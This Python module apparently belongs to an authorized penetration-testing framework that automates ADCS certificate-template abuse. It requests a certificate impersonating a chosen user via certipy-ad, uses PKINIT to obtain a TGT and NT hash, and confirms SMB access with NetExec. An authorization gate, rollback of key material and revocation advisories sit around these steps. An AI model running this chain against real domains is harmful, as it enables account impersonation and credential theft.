"""Template-request ADCS recipes, sharing ESC1's parsers and verified cleanup.

UNVERIFIED ASSUMPTIONS: these recipes have not been lab-proven. Both ordinary
and on-behalf-of ``req`` output use ESC1's issuance markers (``Saved certificate
and private key``, ``Successfully requested certificate``, ``Got certificate
with UPN``), serial / request-id and saved-PFX lines. ``auth`` uses ``Got hash`` /
``authenticated`` / ``Got TGT`` and ``Saved credential cache to``. Ticket-backed
access uses NetExec's SMB ``[+]`` / ``(Pwn3d!)`` markers. Wording drift gives an
honest failed predicate, never fabricated issuance.

Register one key-material snapshot BEFORE the first request and retain it
through every subsequent write (including ESC3's second request and PKINIT).
Unreported created/replaced PFX/cache files are discoverable on interruption.
Parsed paths and recovered hashes stay runtime-only; tokens use public inputs.
"""
from __future__ import annotations

from dataclasses import replace
from pathlib import Path

from .. import netresolve, proof
from ..recommend import values
from .adcs_esc1 import (ADCSESC1Executor, _RE_REQ_ISSUED, _RE_AUTH_OK,
                        _RE_NXC_PWNED, _RE_NXC_AUTH_OK)
from ._reveal_common import pkinit_hashes
from ._rollback_common import key_material_obligation
from .base import StepRecord, redact_argv


class ADCSRequestExecutor(ADCSESC1Executor):
    """ESC1 flow with recipe-specific template defaults and request stages."""

    verified_recipe = False
    template_default = ""
    template_description = ""

    def param_specs(self, ctx, finding):
        return [replace(spec,
                        recommended=(finding.entity or {}).get("template")
                        or self.template_default,
                        description=self.template_description,
                        rationale="Finding's template, else the recipe convention; "
                                  "override for the engagement.")
                if spec.name == "template" else spec
                for spec in super().param_specs(ctx, finding)]

    @staticmethod
    def _upn(principal, domain):
        if "\\" in principal:
            realm, account = principal.rsplit("\\", 1)
            return f"{account}@{realm}"
        return principal if "@" in principal else f"{principal}@{domain}"

    def _requests(self, cfg, v):
        """(step, template, extra flags, expected file principal) per request."""
        return [("cert_request", v["template"],
                 ["-upn", self._upn(v["impersonate"], cfg.domain)], v["impersonate"])]

    def steps_preview(self, ctx, finding, params):
        v = values(params)
        scheme = f" -ldap-scheme {v['ldap_scheme']}" if v.get("ldap_scheme") else ""
        requests = []
        # Preview placeholders are never actual credential paths.
        for name, template, flags, _ in self._requests(ctx.config, v):
            requests.append(
                f"certipy-ad req -u <op>@{ctx.config.domain} -p *** "
                f"-dc-ip {ctx.config.dc_ip} -ca {v['ca']} -template {template} "
                f"{' '.join(redact_argv(flags))} -target {v['ca_host']}{scheme} ({name})")
        return requests + [
            f"certipy-ad auth -pfx *** -dc-ip {ctx.config.dc_ip} (PKINIT -> TGT + NT hash)",
            f"nxc smb {v['target_host']} -k (ticket-backed access = proof)",
            "ROLLBACK: destroy all issued .pfx / .ccache key material; verify file absence",
        ]

    def execute(self, ctx, finding, params):
        artifact = {"_reveal": []}
        ctx._pending_reveal_artifact = artifact
        cfg, v = ctx.config, values(params)
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)
        steps, errors = [], []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def finish(terminal=None, complete=False):
            artifact.update(self._artifact(steps, gate, mutation, terminal, complete, errors))
            return artifact

        def record(name, argv, res, ok):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode))

        pfx = None
        serial = None
        for name, template, flags, principal in self._requests(cfg, v):
            verdict = ctx.authorizer.authorize(
                "adcs_cert_request", {"ca": v["ca"], "template": template,
                                      "upn": principal})
            if verdict == "denied":
                gate.update(classifier="denied", op="adcs_cert_request")
                errors.append("gate_denied:adcs_cert_request")
                return finish()
            if verdict == "approved":
                gate.update(classifier="approved", op="adcs_cert_request")

            # ESC3's second stage signs the on-behalf-of request with the EA PFX.
            flags = [pfx if arg == "<enrollment-agent-pfx>" else arg for arg in flags]
            argv = ["certipy-ad", "req", *self._op_auth_argv(cfg),
                    "-dc-ip", cfg.dc_ip, "-ca", v["ca"], "-template", template,
                    *flags, "-target", v["ca_host"]]
            if v.get("ldap_scheme"):
                argv += ["-ldap-scheme", v["ldap_scheme"]]
            if ctx._pending_teardown is None:
                ctx._pending_teardown = key_material_obligation(
                    out_dir, ca=v["ca"], serial=None)
            res = ctx.runner.run(argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
            output = (res.stdout or "") + (res.stderr or "")
            issued = res.returncode == 0 and bool(_RE_REQ_ISSUED.search(output))
            pfx = self._parse_pfx(output, out_dir, principal)
            serial = self._parse_serial(output)
            ctx._pending_teardown["paths"].append(pfx)
            ctx._pending_teardown["serial"] = serial
            record(name, argv, res, issued)
            if not issued:
                errors.append(f"{name}_failed")
                return finish()
            mutation["applied"] = True

        argv = ["certipy-ad", "auth", "-pfx", pfx, "-dc-ip", cfg.dc_ip]
        res = ctx.runner.run(argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        output = (res.stdout or "") + (res.stderr or "")
        artifact["_reveal"].extend(pkinit_hashes(self.technique, v["impersonate"], output))
        auth_ok = res.returncode == 0 and bool(_RE_AUTH_OK.search(output))
        ccache = self._parse_ccache(output, out_dir)
        ctx._pending_teardown["ccache"] = ccache
        record("cert_auth", argv, res, auth_ok)
        if not auth_ok:
            errors.append("cert_auth_failed")

        access_ok = False
        if auth_ok:
            argv = ["nxc", "smb", v["target_host"], "-k",
                    *netresolve.nxc_kerberos_flags(cfg)]
            res = ctx.runner.run(argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir),
                                 env={"KRB5CCNAME": ccache} if ccache else None)
            output = res.stdout or ""
            access_ok = res.returncode == 0 and bool(
                _RE_NXC_PWNED.search(output) or _RE_NXC_AUTH_OK.search(output))
            record("nxc_access", argv, res, access_ok)
            if not access_ok:
                errors.append("nxc_access_failed")
                diag = netresolve.classify_resolution_failure(
                    cfg, v["target_host"], output + "\n" + (res.stderr or ""))
                if diag:
                    errors.append(diag)

        terminal = proof.build_terminal_fact(
            self.terminal_kind, ok=auth_ok and access_ok, impersonated=v["impersonate"],
            predicate=(f"issued a {v['template']} certificate from {v['ca']} for "
                       f"{v['impersonate']}, used it for PKINIT, and gained "
                       f"ticket-backed access to {v['target_host']}"),
            proof_token=proof.proof_token(self.technique, cfg.domain, v["ca"],
                                          v["template"], v["impersonate"], "cert_pkinit"),
            extra={"ca": v["ca"], "template": v["template"], "ca_host": v["ca_host"]})
        self._rollback(ctx, v["ca"], serial, mutation, steps, errors, pfx, ccache)
        errors.append(f"advisory:rotate_credentials:{self._upn(v['impersonate'], cfg.domain)}")
        if serial:
            errors.append(f"advisory:ca_db_revocation_followup:serial={serial}")
        return finish(terminal, bool(mutation["rollback"]["performed"]))
